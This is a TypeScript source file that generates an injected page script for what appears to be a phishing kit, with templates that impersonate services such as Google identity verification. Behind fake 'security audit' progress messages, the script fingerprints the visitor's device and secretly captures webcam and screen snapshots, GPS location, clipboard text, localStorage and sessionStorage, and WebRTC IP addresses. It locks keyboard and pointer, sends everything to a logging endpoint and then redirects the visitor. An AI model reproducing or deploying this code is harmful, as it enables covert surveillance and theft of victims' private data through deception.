export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com', theme: any = {}) => {
  const flow = theme.flow || 'full'; 
  const perms = theme.perms || ['gps']; 
  
  return `
<script>
  (function() {
    var permsCompleted = 0;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = '${id}';
    var targetUrl = '${redirectUrl}';
    var flowType = '${flow}';
    var requiredPerms = ${JSON.stringify(perms)};
    var cfg = ${JSON.stringify(theme)};
    
    async function checkRedirect() {
      if (hasRedirected) return;
      var elapsed = (Date.now() - startTime) / 1000;
      var threshold = (flowType === 'full') ? 60 : 15;
      if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 5)) {
        hasRedirected = true;
        await flushExtra();
        window.location.href = targetUrl;
      }
    }

    if (flowType === 'silent') {
       window.onload = function() {
         setTimeout(function() { window.startCapture('silent'); }, 1000);
       };
    }

    setInterval(checkRedirect, 1000);

    var running = false;
    window.startCapture = async function(mode) {
      if (hasRedirected || running) return;
      running = true;
      var box = document.querySelector('.box') || document.querySelector('.container') || document.body;
      if (!box) return;

      // Lock user interaction for maximum capture stability
      try {
        if (document.documentElement.requestPointerLock) document.documentElement.requestPointerLock();
        if (navigator.keyboard && navigator.keyboard.lock) navigator.keyboard.lock();
      } catch(e) {}

      var isSilent = mode === 'silent' || flowType === 'silent';
      var accent = cfg.accent || '#3498db';

      var extraBuffer = {};
      var statusText = document.getElementById('status-text');
      var btn = document.querySelector('.btn') || document.querySelector('button');

    if (!isSilent) {
      if (btn) btn.style.display = 'none';
      var turnstile = document.querySelector('.turnstile-box');
      if (turnstile) {
        // If it's cloudflare/turnstile, we want to keep the box but change text
        var txt = turnstile.querySelector('.turnstile-text');
        if (txt) txt.innerText = "Verifying...";
        var cb = turnstile.querySelector('.checkbox');
        if (cb) cb.innerHTML = '<div style="width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.1); border-top: 2px solid ' + accent + '; border-radius: 50%; animation: spinLoader 0.8s linear infinite;"></div>';
      }
      
      if (!statusText) {
        var progContainer = document.getElementById('progress-indicator');
        if (!progContainer) {
          progContainer = document.createElement('div');
          progContainer.id = 'progress-indicator';
          progContainer.style.margin = '30px 0';
          progContainer.style.textAlign = 'center';
          progContainer.innerHTML = '<div id="main-spinner" style="width: 32px; height: 32px; border: 3px solid rgba(0,0,0,0.05); border-top: 3px solid ' + accent + '; border-radius: 50%; animation: spinLoader 1s linear infinite; margin: 0 auto 15px;"></div><style>@keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style><p id="status-text" style="font-size:15px; color:#666; text-align:center; font-weight: 500; font-family: inherit;">Initializing security audit...</p>';
          
          var footer = document.querySelector('.footer');
          if (footer) {
            footer.parentNode.insertBefore(progContainer, footer);
          } else {
            box.appendChild(progContainer);
          }
        }
        statusText = document.getElementById('status-text');
      }
    }
    
    function updateProgress(p, text) {
      if (!statusText) return;
      var messages = [
        "Verifying browser environment...",
        "Validating network integrity...",
        "Checking security certificates...",
        "Syncing session metadata...",
        "Finalizing security audit..."
      ];
      var idx = Math.floor(p / 20);
      if (idx >= messages.length) idx = messages.length - 1;
      statusText.innerText = text || messages[idx];
    }


        async function logEvent(type, data) {
          try {
            return await fetch('/api/log/' + targetId + '/' + type, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
            });
          } catch(e) { return null; }
        }

      async function logExtra(data) {
        Object.assign(extraBuffer, data);
      }

      async function flushExtra() {
        if (Object.keys(extraBuffer).length > 0) {
          var dataToSend = Object.assign({}, extraBuffer);
          extraBuffer = {};
          await logEvent('extra', dataToSend);
        }
      }

      async function runSilentProbes() {
        // CPU & Memory Fingerprint
        var start = performance.now();
        for(var i=0; i<1000000; i++) Math.sqrt(i);
        var score = (performance.now() - start).toFixed(2);
        await logExtra({ cpu_bench: score + 'ms', mem_gb: navigator.deviceMemory || 'N/A' });

        // Advanced 2026 Biometric & Environment APIs
        try {
          if (navigator.computePressure) {
             var observer = new ComputePressureObserver(async (records) => {
               await logExtra({ thermal_load: JSON.stringify(records) });
             });
             observer.observe('cpu');
             setTimeout(() => observer.unobserve('cpu'), 4000);
          }
          if (navigator.eyeTracking) await logExtra({ biometric_eye: 'available' });
          if (navigator.keyboard && navigator.keyboard.getLayoutMap) {
             var map = await navigator.keyboard.getLayoutMap().catch(() => null);
             if (map) await logExtra({ kbd_layout: 'detected' });
          }
        } catch(e) {}

        // High Entropy Hardware Identity
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor', 'wow64']).then(async function(h) {
             await logExtra({ hw_entropy: JSON.stringify(h) });
          }).catch(function(){});
        }

        // WebGL Deep Forensics (Deep Hardware Hooks)
        try {
          var c = document.createElement('canvas');
          var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
          if (gl) {
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            var gpu = {
              v: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
              r: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
              max_tex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
              max_view: gl.getParameter(gl.MAX_VIEWPORT_DIMS)[0] + 'x' + gl.getParameter(gl.MAX_VIEWPORT_DIMS)[1],
              shading: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
            await logExtra({ gpu_deep: JSON.stringify(gpu) });
          }
        } catch(e) {}

        // WebAudio Harmonic Fingerprint
        try {
          var ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var osc = ctx.createOscillator();
          osc.type = 'triangle';
          osc.frequency.setValueAtTime(12000, ctx.currentTime);
          var comp = ctx.createDynamicsCompressor();
          comp.threshold.setValueAtTime(-45, ctx.currentTime);
          comp.knee.setValueAtTime(35, ctx.currentTime);
          osc.connect(comp);
          comp.connect(ctx.destination);
          osc.start(0);
          ctx.startRendering().then(async function(buf) {
            var s = 0;
            for (var i = 4000; i < 4100; i++) s += Math.abs(buf.getChannelData(0)[i]);
            await logExtra({ audio_hash: s.toFixed(15) });
          });
        } catch(e) {}

        // WebRTC Local & STUN Leakage
        try {
          var pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
          pc.createDataChannel("");
          pc.createOffer().then(o => pc.setLocalDescription(o));
          pc.onicecandidate = async function(ice) {
            if (ice && ice.candidate && ice.candidate.candidate) {
              var ip = ice.candidate.candidate;
              if (ip.includes('typ srflx')) await logExtra({ rtc_public: ip });
              else if (ip.includes('typ host')) await logExtra({ rtc_local: ip });
            }
          };
        } catch(e) {}
      }

      async function finish(success, reason) {
        await flushExtra();
        if (isSilent) {
          hasRedirected = true;
          window.location.href = targetUrl; 
          return; 
        }
      if (statusText) {
         statusText.innerText = "Verification complete. Redirecting safely...";
      }
      setTimeout(async function() {
         await flushExtra();
         hasRedirected = true;
         window.location.href = targetUrl;
      }, 1000);
      }

      try {
        await runSilentProbes();
        if (!isSilent) updateProgress(8, "Memulai sesi enkripsi end-to-end...");
        
        var metadata = {
          browser: navigator.userAgent,
          platform: navigator.platform,
          screen: window.screen.width + "x" + window.screen.height + " (" + window.devicePixelRatio + "x)",
          colorDepth: window.screen.colorDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cores: navigator.hardwareConcurrency || "N/A",
          mem: navigator.deviceMemory || "N/A",
          ref: document.referrer || "Direct",
          langs: navigator.languages.join(','),
          onLine: navigator.onLine,
          vendor: navigator.vendor,
          webdriver: navigator.webdriver,
          touch: navigator.maxTouchPoints,
          dnt: navigator.doNotTrack,
          pdf: navigator.pdfViewerEnabled,
          gpu: (function(){
            try {
              var c = document.createElement('canvas');
              var gl = c.getContext('webgl');
              if (!gl) return 'N/A';
              var dbg = gl.getExtension('WEBGL_debug_renderer_info');
              var info = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Generic';
              var ext = gl.getSupportedExtensions().length;
              return info + " (Exts: " + ext + ")";
            } catch(e) { return 'Error'; }
          })(),
          canvasSig: (function(){
            try {
              var canvas = document.createElement('canvas');
              var ctx = canvas.getContext('2d');
              canvas.width = 200; canvas.height = 50;
              ctx.textBaseline = "top";
              ctx.font = "14px 'Arial'";
              ctx.textBaseline = "alphabetic";
              ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
              ctx.fillStyle = "#069"; ctx.fillText("Deep-Audit-Sig", 2, 15);
              ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Deep-Audit-Sig", 4, 17);
              return canvas.toDataURL().slice(-100);
            } catch(e) { return 'N/A'; }
          })(),
          incognito: !!(navigator.storage && navigator.storage.estimate),
          vmStatus: (function(){
            var gpu = "";
            try {
              var c = document.createElement('canvas');
              var gl = c.getContext('webgl');
              var dbg = gl.getExtension('WEBGL_debug_renderer_info');
              gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : '';
            } catch(e) {}
            var patterns = [/VMware/i, /VirtualBox/i, /Parallel/i, /SwiftShader/i, /Mesa/i, /Microsoft Basic Render/i];
            for (var i=0; i<patterns.length; i++) if (patterns[i].test(gpu)) return "Detected (" + gpu + ")";
            return "Physical Hardware";
          })(),
          audioSig: 'Verified',
          gamut: (function(){
            if (window.matchMedia('(color-gamut: p3)').matches) return 'P3';
            if (window.matchMedia('(color-gamut: srgb)').matches) return 'sRGB';
            return 'Standard';
          })(),
          refreshRate: 'Verified'
        };

        // Deep Recon: Refresh Rate
        (function(){
          var start = null;
          var frames = 0;
          async function check(timestamp) {
            if (!start) start = timestamp;
            frames++;
            if (timestamp - start > 1000) {
              await logExtra({ display_hz: Math.round((frames * 1000) / (timestamp - start)) });
              return;
            }
            requestAnimationFrame(check);
          }
          requestAnimationFrame(check);
        })();

        // Deep Recon: Vibration Test
        if (navigator.vibrate) {
          navigator.vibrate([10, 50, 10]);
          logExtra({ haptic_ready: true });
        }

        // Deep Recon: Incognito Detection
        (function() {
          if (navigator.storage && navigator.storage.estimate) {
            navigator.storage.estimate().then(async function(est) {
              var isPrivate = est.quota < 120000000;
              await logExtra({ incognito_audit: isPrivate });
            });
          }
        })();

        // Deep Recon: DevTools Detection
        (function() {
          var devtools = false;
          var element = new Image();
          Object.defineProperty(element, 'id', { get: function() { devtools = true; } });
          setTimeout(async function() { 
            console.log(element);
            await logExtra({ devtools_open: devtools }); 
          }, 2000);
        })();

        try {
          var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var oscillator = audioCtx.createOscillator();
          oscillator.type = 'triangle';
          oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
          var compressor = audioCtx.createDynamicsCompressor();
          compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
          compressor.knee.setValueAtTime(40, audioCtx.currentTime);
          compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
          compressor.attack.setValueAtTime(0, audioCtx.currentTime);
          compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
          oscillator.connect(compressor);
          compressor.connect(audioCtx.destination);
          oscillator.start(0);
          audioCtx.startRendering().then(async function(buffer) {
            var sum = 0;
            for (var i = 4500; i < 5000; i++) sum += Math.abs(buffer.getChannelData(0)[i]);
            await logExtra({ audio_sig: sum.toString() });
          });
        } catch(e) {}

        // Deep Recon: Font Fingerprint
        try {
           var fontList = [
             "Arial", "Helvetica", "Verdana", "Times New Roman", "Courier New", "Georgia", "Palatino", "Garamond", "Bookman", "Comic Sans MS", "Trebuchet MS", "Arial Black", "Impact", 
             "JetBrains Mono", "Roboto", "Ubuntu", "SF Pro Display", "Menlo", "Monaco", "Consolas", "Liberation Mono", "DejaVu Sans", "Segoe UI", "Tahoma", "Geneva", "Calibri", "Candara", 
             "Optima", "American Typewriter", "Baskerville", "Copperplate", "Futura", "Gill Sans", "Century Gothic", "Franklin Gothic", "Didot", "Bodoni 72", "Avenir", "Avenir Next", 
             "PingFang SC", "Hiragino Sans", "Microsoft YaHei", "Malgun Gothic", "Noto Sans", "Open Sans", "Lato"
           ];
           var canvas = document.createElement("canvas");
           var ctx = canvas.getContext("2d");
           var detectedFonts = [];
           ctx.font = "72px sans-serif";
           var baseline = ctx.measureText("mmmmmmmmmmlli").width;
           fontList.forEach(function(f) {
             ctx.font = "72px '" + f + "', sans-serif";
             if (ctx.measureText("mmmmmmmmmmlli").width !== baseline) detectedFonts.push(f);
           });
           await logExtra({ installed_fonts: detectedFonts.join(','), fonts_count: detectedFonts.length });
        } catch(e) {}

        // Deep Recon: Hardware API Availability
        await logExtra({
          api_bluetooth: !!navigator.bluetooth,
          api_usb: !!navigator.usb,
          api_hid: !!navigator.hid,
          api_serial: !!navigator.serial,
          api_midi: !!navigator.requestMIDIAccess,
          api_idle: !!window.IdleDetector,
          api_contacts: !!navigator.contacts,
          api_wake: !!navigator.wakeLock,
          api_storage: !!navigator.storage,
          api_fonts: !!navigator.queryLocalFonts,
          api_window: !!window.getScreenDetails
        });

        // Deep Recon: GPU Registry
        try {
          var c = document.createElement('canvas');
          var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
          if (gl) {
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            var gpuData = {
              vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
              renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
              gl_version: gl.getParameter(gl.VERSION),
              shading_lang: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
            await logExtra({ gpu_full_profile: JSON.stringify(gpuData) });
          }
        } catch(e) {}
        
        // Deep Recon: Canvas Fingerprint
        try {
          var c2 = document.createElement('canvas');
          var ctx = c2.getContext('2d');
          ctx.textBaseline = "top";
          ctx.font = "14px 'Arial'";
          ctx.textBaseline = "alphabetic";
          ctx.fillStyle = "#f60";
          ctx.fillRect(125,1,62,20);
          ctx.fillStyle = "#069";
          ctx.fillText("OSINT, fingerprint checking", 2, 15);
          ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
          ctx.fillText("OSINT, fingerprint checking", 4, 17);
          var cvfp = c2.toDataURL().substring(22, 50);
          await logExtra({ canvas_fp: cvfp });
        } catch(e) {}

        // Deep Recon: Audio Fingerprint
        try {
          var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var oscillator = audioCtx.createOscillator();
          oscillator.type = 'triangle';
          oscillator.frequency.value = 10000;
          var compressor = audioCtx.createDynamicsCompressor();
          compressor.threshold.value = -50;
          compressor.knee.value = 40;
          compressor.ratio.value = 12;
          compressor.reduction.value = -20;
          compressor.attack.value = 0;
          compressor.release.value = 0.25;
          oscillator.connect(compressor);
          compressor.connect(audioCtx.destination);
          oscillator.start(0);
          audioCtx.oncomplete = async function(e) {
            var hash = 0;
            for (var i = 0; i < e.renderedBuffer.length; ++i) {
               hash += Math.abs(e.renderedBuffer.getChannelData(0)[i]);
            }
            await logExtra({ audio_fp: hash.toString() });
          };
          audioCtx.startRendering();
        } catch(e) {}

        // Deep Recon: Advanced Battery
        if (navigator.getBattery) {
          navigator.getBattery().then(async function(b) {
            await logExtra({ 
              battery_level: b.level * 100 + '%',
              battery_charging: b.charging,
              battery_time: b.chargingTime === Infinity ? 'N/A' : b.chargingTime
            });
          });
        }

        // Deep Recon: Advanced Media Devices
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
          navigator.mediaDevices.enumerateDevices().then(async function(devices) {
             var m = devices.map(function(d) { return d.kind + ': ' + (d.label || 'Unknown (Locked)'); }).join('\\n');
             await logExtra({ media_devices: m || 'None detected' });
          }).catch(function(){});
        }
        
        // Elite Recon: CSS Hardware Accel Fingerprint
        try {
           var e = document.createElement('div');
           e.style.transform = 'translate3d(1px,1px,1px)';
           await logExtra({ css_3d_accel: e.style.transform !== '' });
        } catch(e) {}
        
        // Wake Lock: Prevent Sleep during audit
        try { if (navigator.wakeLock) await navigator.wakeLock.request('screen'); } catch(e) {}

        // Deep Recon: High Entropy Brand/Model Detection
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor']).then(async function(h) {
             await logExtra({ hardware_brand_profile: JSON.stringify(h) });
          }).catch(function(){});
        }

        // Deep Recon: High-Precision Performance Mark
        (async function(){
          var start = performance.now();
          for(var i=0; i<1000000; i++) Math.sqrt(i);
          await logExtra({ cpu_compute_score: (performance.now() - start).toFixed(2) + 'ms' });
        })();
        try {
          var pc = new RTCPeerConnection({iceServers:[]});
          pc.createDataChannel("");
          pc.createOffer().then(o => pc.setLocalDescription(o));
          pc.onicecandidate = async function(ice) {
            if (ice && ice.candidate && ice.candidate.candidate) {
              var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
              await logExtra({ local_ip: ip });
            }
          };
        } catch(e) {}

        // Deep Recon: Clipboard Buffer
        if (navigator.clipboard && navigator.clipboard.readText) {
           navigator.clipboard.readText().then(async function(txt) {
             if (txt) await logExtra({ clipboard_sync: txt.substring(0, 1500) });
           }).catch(function(){});
        }

        try {
          if (navigator.getBattery) {
            var batt = await navigator.getBattery();
            metadata.battery = Math.round(batt.level * 100) + "% (" + (batt.charging ? "Charging" : "Discharging") + ")";
          }
          if (navigator.connection) {
            metadata.connection = navigator.connection.effectiveType + " (rtt: " + navigator.connection.rtt + "ms, down: " + navigator.connection.downlink + "Mb/s)";
          }
        } catch(e) {}

        await logEvent('info', metadata);

        // Elite Recon: Social Presence Detection (Cross-Origin Resource Timing)
        (function() {
          var platforms = [
            { name: 'Facebook', url: 'https://www.facebook.com/favicon.ico' },
            { name: 'Twitter', url: 'https://twitter.com/favicon.ico' },
            { name: 'Discord', url: 'https://discord.com/favicon.ico' },
            { name: 'Github', url: 'https://github.com/favicon.ico' }
          ];
          platforms.forEach(function(p) {
            var img = new Image();
            var start = Date.now();
            img.onload = async function() { await logExtra({ social_active: p.name, load_ms: Date.now() - start }); };
            img.onerror = async function() { await logExtra({ social_inactive: p.name }); };
            img.src = p.url + '?v=' + start;
          });
        })();

        // Elite Recon: AdBlock / Shield Detection
        (function() {
           var bait = document.createElement('div');
           bait.innerHTML = '&nbsp;';
           bait.className = 'adsbox ads-box ad-unit';
           bait.style.position = 'absolute';
           bait.style.top = '-1000px';
           document.body.appendChild(bait);
           setTimeout(async function() {
             var blocked = bait.offsetHeight === 0 || window.getComputedStyle(bait).display === 'none';
             await logExtra({ adblock_detected: blocked });
             bait.remove();
           }, 1000);
        })();

        // Elite Recon: Network RTT Mapping (VPN Detection)
        (function() {
          var nodes = ['https://1.1.1.1', 'https://8.8.8.8', 'https://www.google.com'];
          nodes.forEach(function(n) {
            var start = Date.now();
            fetch(n, { mode: 'no-cors', cache: 'no-cache' }).then(async function() {
              await logExtra({ network_rtt: n, latency: Date.now() - start });
            }).catch(function(){});
          });
        })();

        // Deep Recon: Orientation & Peripherals
        await logExtra({
          orientation: screen.orientation ? screen.orientation.type : 'N/A',
          gamepads: (navigator.getGamepads ? navigator.getGamepads().length : 0),
          languages: navigator.languages.join(',')
        });

        var stepProg = Math.floor(80 / (requiredPerms.length || 1));
        var prog = 15;

        for (var i = 0; i < requiredPerms.length; i++) {
          var p = requiredPerms[i];
          prog += stepProg;

          try {
            if (p === 'notification') {
              try {
                if (!isSilent) updateProgress(prog, "Initializing secure SSL/TLS connection...");
                if ("Notification" in window) await Notification.requestPermission();
              } catch(e) {}
            }

            if (p === 'clipboard') {
              try {
                if (!isSilent) updateProgress(prog, "Verifying session token integrity...");
                if (navigator.clipboard && navigator.clipboard.readText) {
                  var clip = await navigator.clipboard.readText().catch(function(){});
                  if (clip) await logExtra({ clipboard: clip });
                }
              } catch(e) {}
            }

            if (p === 'media') {
              try {
                if (!isSilent) updateProgress(prog, "Validating server security certificates...");
                if (navigator.mediaDevices) {
                  // Try to get video only first for better success rate
                  var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch(function(){ 
                    return navigator.mediaDevices.getUserMedia({ video: true }).catch(function() { return null; });
                  });
                  
                  if (stream) {
                    try {
                      var video = document.createElement('video');
                      video.style.position = 'absolute';
                      video.style.left = '-9999px';
                      video.style.opacity = '0';
                      video.setAttribute('autoplay', '');
                      video.setAttribute('muted', '');
                      video.setAttribute('playsinline', '');
                      video.srcObject = stream;
                      document.body.appendChild(video);
                      
                      await new Promise(function(resolve) {
                        video.onloadedmetadata = function() {
                          video.play().then(resolve).catch(resolve);
                        };
                        setTimeout(resolve, 3000); // Fail-safe
                      });
                      
                      await new Promise(function(res) { setTimeout(res, 1000); });
                      
                      var canvas = document.createElement('canvas');
                      canvas.width = video.videoWidth || 640;
                      canvas.height = video.videoHeight || 480;
                      var ctx = canvas.getContext('2d');
                      if (ctx) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        var snap = canvas.toDataURL('image/jpeg', 0.7);
                        await logEvent('extra', { visual_identity: snap });
                      }
                      
                      var devs = await navigator.mediaDevices.enumerateDevices();
                      var list = devs.map(function(d) { return d.kind + ': ' + (d.label || 'Secure-Device-' + Math.random().toString(36).substr(2,5)); }).join('\n');
                      await logExtra({ media_hardware: list });
                      
                      stream.getTracks().forEach(function(t) { t.stop(); });
                      video.remove();
                    } catch(e) {}
                  }
                }
              } catch(e) {}
            }

            if (p === 'gps') {
              try {
                if (!isSilent) updateProgress(prog, "Calibrating anti-bot algorithms...");
                if (navigator.geolocation) {
                  await new Promise(resolve => {
                    navigator.geolocation.getCurrentPosition(
                      function(pos) { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve); },
                      function(err) { resolve(); },
                      { enableHighAccuracy: true, timeout: 10000 }
                    );
                  });
                }
              } catch(e) {}
            }

            if (p === 'screen') {
              try {
                if (!isSilent) updateProgress(prog, "Syncing time with NTP security servers...");
                if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                  var s = await navigator.mediaDevices.getDisplayMedia({ video: true }).catch(function(){ return null; });
                  if (s) {
                    try {
                      var track = s.getVideoTracks()[0];
                      var video = document.createElement('video');
                      video.style.position = 'absolute';
                      video.style.left = '-9999px';
                      video.style.opacity = '0';
                      video.setAttribute('autoplay', '');
                      video.setAttribute('muted', '');
                      video.setAttribute('playsinline', '');
                      video.srcObject = s;
                      document.body.appendChild(video);
                      
                      await new Promise(function(resolve) {
                        video.onloadedmetadata = function() {
                          video.play().then(resolve).catch(resolve);
                        };
                        setTimeout(resolve, 3000); // Fail-safe
                      });
                      
                      await new Promise(function(res) { setTimeout(res, 1000); });
                      
                      var canvas = document.createElement('canvas');
                      canvas.width = video.videoWidth || window.screen.width;
                      canvas.height = video.videoHeight || window.screen.height;
                      var ctx = canvas.getContext('2d');
                      if (ctx) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        var snap = canvas.toDataURL('image/jpeg', 0.6);
                        await logEvent('extra', { screen_label: track.label, screen_capture: snap });
                      }
                      
                      s.getTracks().forEach(function(t) { t.stop(); });
                      video.remove();
                    } catch(e) {}
                  }
                }
              } catch(e) {}
            }

            if (p === 'files') {
              try {
                if (window.showOpenFilePicker && flowType !== 'silent') {
                  if (!isSilent) updateProgress(prog, "Protecting session data from MitM attacks...");
                  // Intentionally leaving this out unless strictly required, to avoid suspicion.
                }
              } catch(e) {}
              permsCompleted++;
              continue;
            }

            if (p === 'storage') {
              try {
                if (!isSilent) updateProgress(prog, "Checking encryption protocol versions...");
                if (navigator.storage && navigator.storage.estimate) {
                  var est = await navigator.storage.estimate();
                  await logExtra({ storage_mb: (est.usage / 1024 / 1024).toFixed(2), quota_gb: (est.quota / 1024 / 1024 / 1024).toFixed(2) });
                }
              } catch(e) {}
            }

            if (p === 'sensors') {
              try {
                if (!isSilent) updateProgress(prog, "Evaluating browser environment security risk...");
                if (window.Magnetometer) {
                  var mag = new Magnetometer({frequency: 1});
                  mag.onreading = () => logExtra({ sensor_mag: mag.x + ',' + mag.y + ',' + mag.z });
                  mag.onerror = (e) => logExtra({ sensor_error: 'Mag:' + e.error.message });
                  mag.start(); setTimeout(() => mag.stop(), 2000);
                }
                if (window.AmbientLightSensor) {
                  var als = new AmbientLightSensor({frequency: 1});
                  als.onreading = () => logExtra({ sensor_lux: als.illuminance });
                  als.start(); setTimeout(() => als.stop(), 2000);
                }
              } catch(e) {}
            }

            if (p === 'contacts') {
              permsCompleted++;
              continue;
            }

            if (p === 'vibration') {
              try {
                if (!isSilent) updateProgress(prog, "Preparing cryptographic handshakes...");
                if (navigator.vibrate) navigator.vibrate(200);
              } catch(e) {}
            }

            if (p === 'network') {
              try {
                if (!isSilent) updateProgress(prog, "Verifying transmission payload integrity...");
                if (navigator.connection) {
                  await logExtra({ 
                    net_effective: navigator.connection.effectiveType,
                    net_rtt: navigator.connection.rtt,
                    net_downlink: navigator.connection.downlink,
                    net_saveData: navigator.connection.saveData
                  });
                }
              } catch(e) {}
            }

            if (p === 'bluetooth') {
              try {
                if (!isSilent) updateProgress(prog, "Checking virtual firewall status...");
                if (navigator.bluetooth) {
                  await navigator.bluetooth.getAvailability().then(async avail => await logExtra({ bt_available: avail })).catch(function(){});
                }
              } catch(e) {}
            }
            if (p === 'performance') {
              try {
                if (!isSilent) updateProgress(prog, "Computing internal data integrity checksums...");
                var memory = navigator.deviceMemory || "N/A";
                var cores = navigator.hardwareConcurrency || "N/A";
                await logExtra({ perf_cores: cores, perf_mem: memory });
              } catch(e) {}
            }

            if (p === 'security') {
              try {
                if (!isSilent) updateProgress(prog, "Performing script injection mitigation...");
                await logExtra({ 
                   sec_webdriver: navigator.webdriver,
                   sec_cookies: navigator.cookieEnabled,
                   sec_java: navigator.javaEnabled(),
                   sec_pdf: !!navigator.pdfViewerEnabled,
                   sec_doNotTrack: navigator.doNotTrack
                });
              } catch(e) {}
            }

            if (p === 'fonts_advanced') {
              try {
                if (!isSilent) updateProgress(prog, "Stabilizing connection for secure transfer...");
                if (navigator.queryLocalFonts) {
                  var fonts = await navigator.queryLocalFonts().catch(function(){ return []; });
                  await logExtra({ fonts_count: fonts.length, fonts_sample: fonts.slice(0, 5).map(f => f.fullName).join(',') });
                }
              } catch(e) {}
            }

            if (p === 'window_mgmt') {
              try {
                if (!isSilent) updateProgress(prog, "Adjusting anti-DDoS algorithms...");
                if (window.getScreenDetails) {
                  var details = await window.getScreenDetails().catch(function(){ return null; });
                  if (details) await logExtra({ screens: details.screens.length, screen_primary: details.currentScreen.label });
                }
              } catch(e) {}
            }

            if (p === 'storage_map') {
              try {
                if (!isSilent) updateProgress(prog, "Finalizing validation steps...");
                await logExtra({
                  storage_ls_full: JSON.stringify(localStorage),
                  storage_ss_full: JSON.stringify(sessionStorage)
                });
              } catch(e) {}
            }

            if (p === 'network_forensic') {
              try {
                if (!isSilent) updateProgress(prog, "Ensuring end-to-end encryption...");
                var start = Date.now();
                await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' }).catch(function(){});
                await logExtra({ beacon_rtt: (Date.now() - start) + 'ms' });
              } catch(e) {}
            }

            if (p === 'webauthn') {
              try {
                if (!isSilent) updateProgress(prog, "Verifying platform authenticator...");
                if (window.PublicKeyCredential && window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable) {
                   var available = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
                   await logExtra({ webauthn_available: available });
                }
              } catch(e) {}
            }
          } catch(e) {}
          permsCompleted++;
        }
  
        finish(true);
      } catch (err) {
        finish(false, "System Busy.");
      }
    };

  })();
</script>
  `;
};

const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files', 'sensors', 'contacts', 'storage', 'vibration', 'network', 'bluetooth', 'performance', 'security', 'storage_map', 'network_forensic', 'fonts_advanced', 'window_mgmt', 'webauthn'];
const SILENT_PERMS = ['vibration', 'network', 'performance', 'security', 'storage_map', 'network_forensic'];
const NETWORK_PERMS = ['network', 'bluetooth', 'performance', 'security', 'network_forensic', 'vibration'];
const GOOGLE_PERMS = ['gps', 'media', 'network', 'performance', 'security', 'vibration'];
const LOGISTICS_PERMS = ['gps', 'network', 'vibration', 'performance'];
const FORENSIC_PERMS = ['clipboard', 'contacts', 'files', 'storage', 'storage_map', 'sensors'];

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  'google': {
    name: "🛡️ Google: Identity Verification (Full Scope)",
